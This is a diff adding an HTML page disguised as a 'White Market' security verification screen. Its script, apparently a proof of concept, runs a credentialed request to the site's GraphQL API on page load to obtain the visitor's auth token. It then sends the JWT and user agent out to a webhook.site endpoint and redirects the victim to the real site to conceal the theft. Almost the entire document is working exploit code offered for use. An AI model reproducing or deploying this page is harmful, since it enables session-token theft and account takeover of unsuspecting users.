@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>White Market - Security Verification</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; 
+                  border-radius: 50%; width: 50px; height: 50px; 
+                  animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 
+                          100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h1>White Market Security Update</h1>
+    <p>Verifying your account credentials...</p>
+    <div class="loader"></div>
+    
+    <script>
+        async function exploit() {
+            try {
+                const response = await fetch('https://api.white.market/graphql/api', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'x-accept-language': 'en_US'
+                    },
+                    body: JSON.stringify({
+                        query: `
+                            mutation AuthToken {
+                                auth_token {
+                                    accessToken
+                                }
+                            }
+                        `,
+                        operationName: "AuthToken"
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.data && data.data.auth_token) {
+                    const jwt = data.data.auth_token.accessToken;
+                    
+                    // Exfiltrate JWT
+                    await fetch('https://webhook.site/YOUR-UNIQUE-URL', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            jwt: jwt,
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent
+                        })
+                    });
+                }
+                
+            } catch(e) {
+                console.error('Exploit failed:', e);
+            }
+            
+            // Redirect to real site after 3 seconds
+            setTimeout(() => {
+                window.location = 'https://white.market'\;
+            }, 3000);
+        }
+        
+        exploit();
+    </script>
+</body>
+</html>
